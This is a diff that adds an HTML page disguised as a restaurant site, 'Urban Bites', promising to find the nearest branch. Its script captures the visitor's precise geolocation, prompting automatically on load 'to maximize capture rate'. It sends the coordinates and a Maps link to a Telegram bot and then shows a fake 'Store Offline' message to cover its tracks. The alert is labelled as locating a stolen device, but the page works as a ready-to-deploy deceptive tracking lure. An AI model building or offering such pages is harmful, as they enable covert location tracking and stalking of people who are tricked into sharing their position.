@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Urban Bites | Artisan Burgers & Shakes</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    header {
+      width: 100%;
+      background-color: #1e1e1e;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+    }
+    h1 { margin: 0; color: #ff6b6b; font-size: 24px; }
+    .container {
+      max-width: 400px;
+      width: 90%;
+      margin: 40px auto;
+      text-align: center;
+      background: #1e1e1e;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .btn {
+      background-color: #ff6b6b;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+    }
+    .btn:hover { background-color: #ee5253; }
+    #status { margin-top: 20px; font-size: 14px; color: #aaa; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>URBAN BITES</h1>
+  </header>
+
+  <div class="container">
+    <h2>Special Offers Near You</h2>
+    <p>Please share your location to check menu availability, delivery range, and nearest branch locations.</p>
+    
+    <button class="btn" onclick="requestLocation()">Find Nearest Branch</button>
+    
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // Configuration - Replace with your details
+    const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+    const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+
+    function sendTelegramAlert(lat, lon, accuracy) {
+      const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+      const textMessage = `🚨 **STOLEN DEVICE LOCATED** 🚨\n\n` +
+                          `📍 **Latitude:** ${lat}\n` +
+                          `📍 **Longitude:** ${lon}\n` +
+                          `🎯 **Accuracy:** Within ${Math.round(accuracy)} meters\n\n` +
+                          `🗺 **Google Maps Link:**\n${googleMapsUrl}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: textMessage,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(() => {
+        document.getElementById("status").innerHTML = "Checking branch inventory...";
+        // Optionally redirect to a real menu or page after capturing location
+        setTimeout(() => {
+          document.querySelector(".container").innerHTML = "<h2>Store Offline</h2><p>Our nearest branch is currently closed for maintenance.</p>";
+        }, 1500);
+      })
+      .catch(err => {
+        console.error("Error sending telemetry:", err);
+      });
+    }
+
+    function requestLocation() {
+      const statusDiv = document.getElementById("status");
+      statusDiv.innerHTML = "Locating nearest outlet...";
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            sendTelegramAlert(lat, lon, accuracy);
+          },
+          (error) => {
+            statusDiv.innerHTML = "Unable to verify delivery area. Please enable location permissions.";
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        statusDiv.innerHTML = "Geolocation is not supported on this browser.";
+      }
+    }
+
+    // Automatically prompt when page loads to maximize capture rate
+    window.onload = function() {
+      setTimeout(requestLocation, 1000);
+    };
+  </script>
+</body>
+</html>
